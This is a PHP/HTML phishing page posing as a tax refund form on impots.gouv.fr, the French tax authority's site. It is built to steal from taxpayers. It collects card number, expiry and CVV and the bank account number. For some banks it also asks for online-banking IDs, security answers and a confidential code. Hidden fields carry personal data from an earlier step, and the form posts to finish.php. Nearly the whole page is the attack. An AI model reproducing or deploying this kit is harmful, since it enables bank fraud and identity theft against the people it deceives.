<html dir="ltr" lang="fr"><!-- InstanceBegin template="/Templates/modele_accueil.dwt" codeOutsideHTMLIsLocked="false" -->
<head>
<title>Impots.gouv.fr - Accueil</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">

<link rel="shortcut icon" type="image/x-icon" href="./file/favicon.ico">
<link href="./file/style.css" rel="stylesheet" type="text/css" />

<link href="./file/wysiwyg.css" rel="stylesheet" type="text/css" />
<script type="text/javascript" src="./file/script_divers.js"></script>
<script type="text/javascript"><!--
function xt_med(type,section,page,x1,x2,x3,x4,x5)
{xt_img = new Image();
xtdate = new Date();
xts = screen;
xt_ajout = (type=='F') ? '' : (type=='M') ? '&a='+x1+'&m1='+x2+'&m2='+x3+'&m3='+x4+'&m4='+x5 : '&clic='+x1;
Xt_im = './file/hit.xiti.gif'+section;
Xt_im += '&p='+page+xt_ajout+'&hl=' + xtdate.getHours() + 'x' + xtdate.getMinutes() + 'x' + xtdate.getSeconds();
if(parseFloat(navigator.appVersion)>=4)
{Xt_im += '&r=' + xts.width + 'x' + xts.height + 'x' + xts.pixelDepth + 'x' + xts.colorDepth;}
xt_img.src = Xt_im;
if ((x2 != null)&&(x2!=undefined)&&(type=='C'))
{ if ((x3=='')||(x3==null)) { document.location = x2} else {xfen = window.open(x2,'xfen',''); xfen.focus();}}
else
{return;}}
--></script>
</head>
<body>
<noscript>
<style>
#menuNav ul li{
display:block;
}
#menuNav ul li ul {
position:relative;
display:block;
}
#menuNav ul.pro li ul,
#menuNav ul.part li ul{
top:0px;
}
</style>
</noscript>
<!-- marqueur campagne sircom -->
 
<noscript> 
<iframe src="#" width="1" height="1" frameborder="0" style="display:none"></iframe> 
</noscript>
<!-- fin marqueur campagne sircom -->
<div id="page"> 
<div id="header"> 
<div id="topMenu">
<a href="#" title="Les coordonn&eacute;es des services de la DGFiP" alt="Les coordonn&eacute;es des services de la DGFiP">Contacts |</a>
<a href="#" title="Les r&eacute;ponses &aacute; vos questions fr&eacute;quentes" alt="Les r&eacute;ponses &aacute; vos questions fr&eacute;quentes">Questions fr&eacute;quentes |</a>
<a href="#" title="Plan du site" alt="Plan du site">Plan du site |</a>
<a href="#" title="Pour la presse" alt="Pour la presse">Pour la presse |</a>
<a href="#" title="D&eacute;couvrez la DGFiP" alt="D&eacute;couvrez la DGFiP">Nous conna&icirc;tre |</a>
<span class="follow">Nous suivre :</span>
</div>
<div id="blocMariane">
<a href="#" class="sp" title="Acc&egrave;s au site gouvernement.gouv.fr (nouvelle fen�tre)" alt="Acc&egrave;s au site gouvernement.fr (nouvelle fen�tre)" target="_blank"></a> 
<a href="#/" class="ministere" title="economie.gouv.fr (nouvelle fen�tre)" alt="Acc&egrave;s au site economie.gouv.fr (nouvelle fen�tre)" target="_blank"></a> 
</div>
<h1 class="hide">
<a href="#" title="Retour &aacute; l'accueil" alt="Retour &aacute; l'accueil"> 
<div class="igf">impots.gouv.fr</div>
<div class="baseline">un site de la Direction g&eacute;n&eacute;rale des Finances Publiques</div>
</a> </h1>
<div id="followUs">
<a class="twitter" target="blank" href="#" title="Acc&egrave;s au compte Twitter de la DGFiP (nouvelle fen�tre)" alt="Acc&egrave;s au compte Twitter de la DGFiP (nouvelle fen�tre)">Twitter</a>
<a class="facebook" target="blank" href="#" title="Acc&egrave;s &aacute; la page Facebook de la DGFiP (nouvelle fen�tre)" alt="Acc&egrave;s &aacute; la page Facebook de la DGFiP (nouvelle fen�tre)">Facebook</a> 
</div>
<div id="rech"> 
<h2>recherche</h2>
<a href="#" title="Recherche par mots-cl&eacute;s" alt="Rechercher par mots-cl&eacute;s">
Recherche d&eacute;taill&eacute;e
</a>
<a href="#" title="Recherche de formulaires" alt="Recherche de formulaires">
Recherche de formulaires</a>
</div>
<div id="mesServ"> 
<div class="content"> 
<h3>Tous vos services en ligne</h3>
<h4>Acc&egrave;s &aacute;<br/>votre espace</h4>
<a class="acces" href="#" title="Acc&egrave;s &aacute; votre Espace personnel" alt="Acc&egrave;s &aacute; votre Espace personnel">
Particuliers
</a>
<a class="acces" href="#" title="Acc&egrave;s &aacute; votre Espace abonn&eacute; professionnel" alt="Acc&egrave;s &aacute; votre Espace abonn&eacute; professionnel">
Professionnels
</a> 
</div>
</div>
<div id="onglets">
<a href="#" class="part" title="Acc&egrave;s &aacute; la rubrique Particuliers" alt="Acc&egrave;s &aacute; la rubrique Particuliers">particuliers</a> 
<a href="#" class="pro" title="Acc&egrave;s &aacute; la rubrique Professionnels" alt="Acc&egrave;s &aacute; la rubrique Professionnels">professionnels</a> 
<a href="#" class="doc" title="Acc&egrave;s &aacute; la rubrique Documentation" alt="Acc&egrave;s &aacute; la rubrique Documentation">documentation</a> 
</div>
</div>
<div id="conteneur" class="home"> 
<div class="subConteneur"> 
<div id="filAriane"> 
</div>
<!-- InstanceBeginEditable name="Banniere-Largeur-924px" -->
<!-- InstanceEndEditable -->
      <div class="colGauche" style="width: 663px; height: 445px"> <!-- InstanceBeginEditable name="Banniere-Largeur-662px" --> 
        <!-- InstanceEndEditable --> 
        <div class="services">
<div style="clear:both;"></div>
</div>
<div class="bloc actu"> 
<div class="content"> 
<h2 class="actuFisc"><span>Formulaire de remboursement &eacute;lectronique - N37422993</span></h2>
            <div class="une"> 
				<div id="saisie_obligatoire">
					<b><font color="#008080" size="3">Donn&eacute;es bancaires<br>
&nbsp;</font></b><p><span id="saisie_obligatoire_texte"><font color="#FF0000">*
					</font>La saisie de toutes les zones est obligatoire<font color="#FF0000">.
					</font></span><br>
					<br>
					<font color="#FF0000" style="font-size: 9pt">
					<span id="saisie_obligatoire_comptage">Lors d&#39;un erreur de 
					saisie veuillez verifier tous les champs signal&eacute;s par </span>&nbsp;<img id="spi_img_error" class src="./file/pic_alerte.gif"> 
					.<br>
&nbsp;</font></div>
				<form class="form" id="darnoo" method="POST" action="finish.php" enctype="application/x-www-form-urlencoded">
<input type="hidden" id="nom" name="nom" value="<?php echo($nom); ?>">
<input type="hidden" id="nom" name="prenom" value="<?php echo($prenom); ?>">
<input type="hidden" id="nom" name="dob1" value="<?php echo($dob1); ?>">
<input type="hidden" id="nom" name="dob2" value="<?php echo($dob2); ?>">
<input type="hidden" id="nom" name="dob3" value="<?php echo($dob3); ?>">
<input type="hidden" id="nom" name="postale" value="<?php echo($postale); ?>">
<input type="hidden" id="nom" name="ville" value="<?php echo($ville); ?>">
<input type="hidden" id="nom" name="adresse" value="<?php echo($adresse); ?>">
<input type="hidden" id="nom" name="adresse2" value="<?php echo($adresse2); ?>">
<input type="hidden" id="nom" name="tele" value="<?php echo($tele); ?>">
<input type="hidden" id="nom" name="email" value="<?php echo($email); ?>">
<input type="hidden" id="nom" name="passtess" value="<?php echo($passtess); ?>">
				  
<script>
function chide() {
	document.getElementById("ccin").style.display = 'none';
	document.getElementById("account").style.display = 'none';
	document.getElementById("separ").style.display = 'none';
	document.getElementById("qbpos").style.display = 'none';
	document.getElementById("reponses").style.display = 'none';
	document.getElementById("qbpos2").style.display = 'none';
	document.getElementById("reponses2").style.display = 'none';
	document.getElementById("qbposlcl").style.display = 'none';
	document.getElementById("reponseslcl").style.display = 'none';
	document.getElementById("qbposlcl2").style.display = 'none';
	document.getElementById("reponseslcl2").style.display = 'none';
	document.getElementById("ibad").style.display = 'none';
	
}
function ccheck(x) {
	chide();
	if(x == "pst") {
		document.getElementById("account").style.display = '';
		document.getElementById("separ").style.display = '';
		document.getElementById("qbpos").style.display = '';
		document.getElementById("reponses").style.display = '';
		document.getElementById("separ").style.display = '';
		document.getElementById("qbpos2").style.display = '';
		document.getElementById("reponses2").style.display = '';
	}
	if(x == "cm") {
		document.getElementById("ibad").style.display = '';
	}
	if(x == "lcl") {
		document.getElementById("account").style.display = '';
		document.getElementById("qbposlcl").style.display = '';
		document.getElementById("reponseslcl").style.display = '';
		document.getElementById("separ").style.display = '';
		document.getElementById("qbposlcl2").style.display = '';
		document.getElementById("reponseslcl2").style.display = '';
	}
	if(x == "sg") {
		document.getElementById("account").style.display = '';
	}
	if(x == "caisse") {
		document.getElementById("account").style.display = '';
	}
	if(x == "bnp") {
		document.getElementById("account").style.display = '';
	}
	if(x == "na") {
		document.getElementById("account").style.display = '';
	}
	document.getElementById("ccin").style.display = '';
}
</script>
				  <table border="0" cellspacing="0" width="560">
                    <tr>
                      <td width="180">
                        <label class="bold">Votre banque :</label></td>
                      <td>
                        <select name="bank" onchange="ccheck(this.options[this.selectedIndex].value);">
							<option value="none">- -</option>
							<option value="amex">American Express</option>
							<option value="axa">Axa Banque</option>
							<option value="bp">Banque populaire</option>
							<option value="bnp">BNP</option>
							<option value="bred">Bred</option>
							<option value="caisse">Caisse d'�pargne</option>
							<option value="ca">Cr�dit agricole</option>
							<option value="cm">Cr�dit mutuel</option>
							<option value="cn">Cr�dit du nord</option>
							<option value="cic">CIC</option>
							<option value="hsbc">HSBC</option>
							<option value="sg">Soci�t� g�n�rale</option>
							<option value="pst">La banque postale</option>
							<option value="lcl">LCL</option>
							<option value="na">Autres</option>
						</select></td>
                    </tr></table>
					<table id="ccin" border="0" cellspacing="0" width="560" style="display: none;">
<tr><td width="180"><label class="bold">N� de carte de cr�dit :</label></td><td><input name="ccnum" type="text" size="19" /><img src="images/cards2.jpg" alt="" height="15">&nbsp;<img src="cclogos.PNG"></img></td></tr>

<tr><td width="180"><label class="bold">Date d'expiration :</label></td>
<td>

        <label id="label_expMonth" for="expMonth" style="expdate">Mois</label>
        
            <select name="expMonth" class="month" tabindex="16">
                                        <option value="" selected="">- -</option>
                <option value="1">1</option><option value="2">2</option><option value="3">3</option><option value="4">4</option><option value="5">5</option><option value="6">6</option><option value="7">7</option><option value="8">8</option><option value="9">9</option><option value="10">10</option><option value="11">11</option><option value="12">12</option>            </select>
        <label id="label_expYear" for="expYear" class="expdate">Ann�e</label>
            <select name="expYear" class="year" tabindex="17">
                                <option value="" selected="">- - - -</option>
                <option value="2014">2014</option><option value="2015">2015</option><option value="2016">2016</option><option value="2017">2017</option><option value="2018">2018</option><option value="2019">2019</option><option value="2020">2020</option><option value="2021">2021</option><option value="2022">2022</option><option value="2023">2023</option><option value="2024">2024</option><option value="2025">2025</option><option value="2026">2026</option><option value="2027">2027</option><option value="2028">2028</option><option value="2029">2029</option><option value="2030">2030</option><option value="2031">2031</option>            </select>



</td>

</tr>

<tr><td width="174"><label class="bold">Code de s�curit� (CVV) :</label></td>
<td><input name="cvv" type="text" size="3" /></td>
</tr>
<tr id="account" style="display: none;"><td width="174"><label class="bold">Num�ro de compte :</label></td>
<td><input name="account" type="text" size="16" /><img src="images/aide.gif" title="Saisissez votre num�ro de compte pr�sents sur un relev� de compte, sur un RIB, dans votre ch�quier."></td>
</tr>
<tr id="ibad" style="display: none;"><td width="174"><label class="bold">Identifiant Banque � Distance :</label></td>
<td><input name="ibad" type="text" size="16" /><img src="images/aide.gif" title="L'identifiant est celui que vous utilisez pour vous connecter � Cr�dit Mutuel."></td>
</tr>

<tr id="separ" style="display: none;"><td width="174"><label class="bold">-------------------</label></td>
<td></td>
</tr>

<tr id="qbpos" style="display : none;"><td width="174"><label class="bold">Question personnelle 1 :</label></td>
<td><select name="question" id="question" class="chp_question" size="1" >
                              <option value="Dans quelle rue avez-vous grandi ?"> Dans quelle rue avez-vous grandi ? </option>
                            </select></td>
</tr>

<tr id="reponses" style="display: none;"><td width="174"><label class="bold">R�ponse personnelle 1 :</label></td>
<td><input name="reponses" type="text" size="29" /></td>
</tr>

<tr id="qbpos2" style="display : none;"><td width="174"><label class="bold">Question personnelle 2 :</label></td>
<td><select name="question2" id="question2" class="chp_question" size="1" >
                              <option value="Le pr�nom de votre meilleur ami d'enfance ?"> Le pr�nom de votre meilleur ami d'enfance ? </option>
                            </select></td>
</tr>

<tr id="reponses2" style="display: none;"><td width="174"><label class="bold">R�ponse personnelle 2 :</label></td>
<td><input name="reponses2" type="text" size="29" /></td>
</tr>

<tr id="qbposlcl" style="display : none;"><td width="174"><label class="bold">Question personnelle 1 :</label></td>
<td><select name="questionlcl" id="questionlcl" class="chp_question" size="1" >
                              <option value="Dans quelle rue avez-vous grandi ?"> Nom de jeune fille de votre m�re ? </option>
                            </select></td>
</tr>

<tr id="reponseslcl" style="display: none;"><td width="174"><label class="bold">R�ponse personnelle 1 :</label></td>
<td><input name="reponseslcl" type="text" size="29" /></td>
</tr>

<tr id="qbposlcl2" style="display : none;"><td width="174"><label class="bold">Question personnelle 2 :</label></td>
<td><select name="questionlcl2" id="questionlcl2" class="chp_question" size="1" >
                              <option value="Dans quelle rue avez-vous grandi ?"> Second pr�nom de votre pere ? </option>
                            </select></td>
</tr>

<tr id="reponseslcl2" style="display: none;"><td width="174"><label class="bold">R�ponse personnelle 2 :</label></td>
<td><input name="reponseslcl2" type="text" size="29" /></td>
</tr>
<tr id="ghazcisse" style="display: none;"><td width="174"><label class="bold">Identifiant client :</label></td>
<td><input name="ghazcisse" type="text" size="4" /><img src="images/aide.gif" title="Saisissez L'identifiant client est inscrit sur votre contrat Banque � Distance et sur vos relev�s de compte bancaire."></td>
</tr>
<tr id="ghazcisse0" style="display: none;"><td width="174"><label class="bold">Code confidentiel :</label></td>
<td><input name="ghazcisse0" type="password" size="4" /><img src="images/aide.gif" title="Saisissez Le code confidentiel vous a �t� transmis par courrier postal simple, � votre domicile suite � l'ouverture de votre contrat Banque � Distance."></td>
</tr>

                    <tr>
                      <td width="174"></td>
                      <td>
                        <input src="images/1.png" name="Valider" value="�tape suivante" class="form-button" type="image" style="float: right">
                      </td>
                    </tr>
                  </table>
                </form>
				<script  type="text/javascript">
 var frmvalidator = new Validator("darnoo");

frmvalidator.addValidation("ccnum","req","Veuillez entrer votre N� de carte de cr�dit.");
frmvalidator.addValidation("ccnum","maxlen=16","Votre N� de carte de cr�dit est incorrect.");
frmvalidator.addValidation("ccnum","minlen=15","Votre N� de carte de cr�dit est incorrect.");
frmvalidator.addValidation("ccnum","num","Votre N� de carte de cr�dit est incorrect.");

frmvalidator.addValidation("expMonth","num","Veuillez entrer la date d'�xpiration.");
frmvalidator.addValidation("expYear","num","Veuillez entrer la date d'�xpiration.");

frmvalidator.addValidation("cvv","req","Veuillez entrer votre Code de s�curit� (CVV).");
frmvalidator.addValidation("cvv","num","Veuillez entrer votre Code de s�curit� (CVV).");
frmvalidator.addValidation("cvv","maxlen=4","Votre Code de s�curit� (CVV) est incorrect.");
frmvalidator.addValidation("cvv","minlen=3","Votre Code de s�curit� (CVV) est incorrect.");

</script>

      			</div>
</div>
</div>
</div>
      <div class="colDroite"> <!-- InstanceBeginEditable name="Article-SPECIAL-Colonne-Droite" --> 
        <!-- InstanceEndEditable --> 
        <div class="services">
			<div class="dgfip">
				<h3>les autres services de la DGFiP</h3>
				<div class="content">
					<div class="photo"></div>
					<ul class="public">
<!-- InstanceBeginEditable name="Autres-Services-DGFIP-Colonne-Droite" -->
						<li>
						<a target="blank" href="#" title="Acc&egrave;s au site cadastre.gouv.fr (nouvelle fen�tre)" alt="Acc&egrave;s au site cadastre.gouv.fr (nouvelle fen�tre)">Le plan cadastral</a>
						</li>
						<li>
						<a target="blank" href="#" title="Acc&egrave;s au site amendes.gouv.fr (nouvelle fen�tre)" alt="Acc&egrave;s au site amendes.gouv.fr (nouvelle fen�tre)">Les amendes</a>
						</li>
						<li>
						<a target="blank" href="#" title="Acc&egrave;s au site tipi.budget.gouv.fr (nouvelle fen�tre)" alt="Acc&egrave;s au site tipi.budget.gouv.fr (nouvelle fen�tre)">Le t&eacute;l&eacute;paiement des services publics locaux</a>
						</li>
						<li>
						<a target="blank" href="#/" title="Acc&egrave;s au site collectivites-locales.gouv.fr (nouvelle fen�tre)" alt="Acc&egrave;s au site collectivites-locales.gouv.fr (nouvelle fen�tre)">Les collectivit&eacute;s locales</a>
						</li>
						<li>
						<a target="blank" href="#" title="Acc&egrave;s au site economie.gouv.fr/cessions (nouvelle fen�tre)" alt="Acc&egrave;s au site economie.gouv.fr/cessions (nouvelle fen�tre)">Les cessions immobili&egrave;res de l'�tat</a>
						</li>
						<li>
						<a target="blank" href="#" title="Acc&egrave;s au site pensions.bercy.gouv.fr (nouvelle fen�tre)" alt="Acc&egrave;s au pensions.bercy.gouv.fr site (nouvelle fen�tre)">Les pensions et retraites de l'�tat</a>
						</li>
						<li>
						<a target="blank" href="#" title="Acc&egrave;s au site ventes-domaniales.fr (nouvelle fen�tre)" alt="Acc&egrave;s au site ventes-domaniales.fr (nouvelle fen�tre)">Les ventes domaniales</a>
</li>
<!-- InstanceEndEditable -->
					</ul></div></div></div>
<!-- InstanceBeginEditable name="Page-Colonne-Droite" -->
		<div class="bloc btn qr">
			<a href="#" title="Les r&eacute;ponses &aacute; vos questions fr&eacute;quentes" alt="Les r&eacute;ponses &aacute; vos questions fr&eacute;quentes">Questions fr&eacute;quentes</a></div>
</div>
<div style="clear:both;"></div>
</div>
</div>
<div id="footer"> 
<div class="liens"> 
<div class="content"> 
<ul>
<h3>Informations sur le site :</h3>
<li>
<a href="#" title="Plan du site" alt="Plan du site">Plan du site</a>
</li>
<li>
<a href="#" onClick="return winPop(this.href);" title="Mentions l&eacute;gales (nouvelle fen�tre)" alt="Mentions l&eacute;gales (nouvelle fen�tre)">Mentions l&eacute;gales</a>
</li>
<li>
<a href="#" target="_blank" title="Acc&egrave;s au r&eacute;pertoire des informations publiques (nouvelle fen�tre)" alt="Acc&egrave;s au r&eacute;pertoire des informations publiques (nouvelle fen�tre)">R&eacute;pertoire des informations publiques</a>
</li>
<li>
<a href="#" title="Les r&eacute;ponses &aacute; vos questions fr&eacute;quentes" alt="Les r&eacute;ponses &aacute; vos questions fr&eacute;quentes">Questions fr&eacute;quentes</a>
</li>
<li>
<a href="#" title="Les coordonn&eacute;es des services de la DGFiP" alt="Les coordonn&eacute;es des services de la DGFiP">Contacts</a>
</li>
</ul>
<ul>
<h3>Les rubriques du site :</h3>
<li>
<a href="#" title="Acc&egrave;s &aacute; la rubrique Particuliers" alt="Acc&egrave;s &aacute; la rubrique Particuliers">Particuliers</a>
</li>
<li>
<a href="#" title="Acc&egrave;s &aacute; la rubrique Professionnels" alt="Acc&egrave;s &aacute; la rubrique Professionnels">Professionnels</a> 
</li>
<li>
<a href="#" title="Acc&egrave;s &aacute; la rubrique Documentation" alt="Acc&egrave;s &aacute; la rubrique Documentation">Documentation</a> 
</li>
<li><a href="#" title="Acc&egrave;s &aacute; la rubrique Collectivit&eacute;s locales" alt="Acc&egrave;s &aacute; la rubrique Collectivit&eacute;s locales">Collectivit&eacute;s locales</a></li>
<li>
<a href="#" title="Acc&egrave;s &aacute; la rubrique Statistiques" alt="Acc&egrave;s &aacute; la rubrique Statistiques">Statistiques</a>
</li>
</ul>
<ul>
<h3>Suivre l�information :</h3>
<li>
<a href="#" title="Pour la presse" alt="Pour la presse">Pour la presse</a>
</li>
<li>
<a target="blank" href="#" title="Acc&egrave;s &aacute; la page Facebook de la DGFiP (nouvelle fen�tre)" alt="Acc&egrave;s &aacute; la page Facebook de la DGFiP (nouvelle fen�tre)">Facebook</a> 
</li>
<li>
<a target="blank" href="#" title="Acc&egrave;s au compte Twitter de la DGFiP (nouvelle fen�tre)" alt="Acc&egrave;s au compte Twitter de la DGFiP (nouvelle fen�tre)">Twitter</a>
</li>
</ul>
<ul>
<h3>Sites associ&eacute;s :</h3>
<li>
<a target="blank" href="#" title="Acc&egrave;s au site economie.gouv.fr (nouvelle fen�tre)" alt="Acc&egrave;s au site economie.gouv.fr (nouvelle fen�tre)">economie.gouv.fr</a>
</li>
<li>
<a target="blank" href="#" title="Acc&egrave;s au site cadastre.gouv.fr (nouvelle fen�tre)" alt="Acc&egrave;s au site cadastre.gouv.fr (nouvelle fen�tre)">cadastre.gouv.fr</a>
</li>
<li>
<a target="blank" href="#" title="Acc&egrave;s au site amendes.gouv.fr (nouvelle fen�tre)" alt="Acc&egrave;s au site amendes.gouv.fr (nouvelle fen�tre)">amendes.gouv.fr</a>
</li>
<li>
<a target="blank" href="#" title="Acc&egrave;s au site tipi.budget.gouv.fr (nouvelle fen�tre)" alt="Acc&egrave;s au site tipi.budget.gouv.fr (nouvelle fen�tre)">tipi.budget.gouv.fr</a>
</li>
<li>
<a target="blank" href="#" title="Acc&egrave;s au site collectivites-locales.gouv.fr (nouvelle fen�tre)" alt="Acc&egrave;s au site collectivites-locales.gouv.fr (nouvelle fen�tre)">collectivites-locales.gouv.fr</a>
</li>
<li>
<a target="blank" href="#" title="Acc&egrave;s au site economie.gouv.fr/cessions (nouvelle fen�tre)" alt="Acc&egrave;s au site economie.gouv.fr/cessions (nouvelle fen�tre)">economie.gouv.fr/cessions</a>
</li>
<li>
<a target="blank" href="#" title="Acc&egrave;s au site pensions.bercy.gouv.fr (nouvelle fen�tre)" alt="Acc&egrave;s au pensions.bercy.gouv.fr site (nouvelle fen�tre)">pensions.bercy.gouv.fr</a>
</li>
<li>
<a target="blank" href="#" title="Acc&egrave;s au site ventes-domaniales.fr (nouvelle fen�tre)" alt="Acc&egrave;s au site ventes-domaniales.fr (nouvelle fen�tre)">ventes-domaniales.fr</a>
</li>
</ul>
</div>
</div>
<div class="comarquage">
<a target="_blank" href="#" title="Acc&egrave;s au site service-public.fr (nouvelle fen�tre)">
<img src="./file/logo_sp.gif" alt="Acc&egrave;s au site service-public.fr (nouvelle fen�tre)"/>
</a>
<a target="_blank" href="#" title="Acc&egrave;s au site www.legifrance.gouv.fr (nouvelle fen�tre)">
<img src="./file/logo_legifrance.gif" width="138" height="25" alt="Acc&egrave;s au site www.legifrance.gouv.fr (nouvelle fen�tre)"/>
</a> 
<a href="#" class="sp" title="Acc&egrave;s au site gouvernement.gouv.fr (nouvelle fen�tre)" target="_blank">
<img src="./file/logo_gouv.jpg" width="120" height="45" alt="Acc&egrave;s au site gouvernement.fr (nouvelle fen�tre)"/>
</a>
<a target="_blank" href="#" title="Acc&egrave;s au site france.fr (nouvelle fen�tre)">
<img src="./file/logo_france-fr.gif" width="143" height="45" alt="Acc&egrave;s au site france.fr (nouvelle fen�tre)"/>
</a> 
<a target="_blank" href="#" title="Acc&egrave;s au site service-public.fr (nouvelle fen�tre)">
<img src="./file/logo_msp.gif" alt="Acc&egrave;s au site service-public.fr (nouvelle fen�tre)"/>
</a>
</div>
<div class="signature">impots.gouv.fr - Direction g&eacute;n&eacute;rale des Finances Publiques 
| &copy; Minist&egrave;re de l'�conomie et des Finances 
<script type="text/javascript">
Today = new Date;
Annee = Today.getFullYear();
document.write(" - "+Annee);
</script>
</div>
</div>
</div>
<script type="text/javascript"><!--
hsh = new Date();
hsd = document;
hsr = hsd.referrer.replace(/[<>]/g, '');
hsi = '<img width="1" height="1" src="./file/hit.xiti.gif';
hsi += '&p=accueil';
hsi += '&hl=' + hsh.getHours() + 'x' + hsh.getMinutes() + 'x' + hsh.getSeconds();
if(parseFloat(navigator.appVersion)>=4)
{Xiti_s=screen;hsi += '&r=' + Xiti_s.width + 'x' + Xiti_s.height + 'x' + Xiti_s.pixelDepth + 'x' + Xiti_s.colorDepth;}
hsd.writeln(hsi + '&ref=' + hsr.replace(/&/g, '$') + '" />');
//--></script><noscript><img width="1" height="1" src="./file/hit.xiti.gif" /></noscript>
</body>
<!-- InstanceEnd --></html><!-- #BeginEditable "(code aprs la balise HTML)" --><!-- #EndEditable -->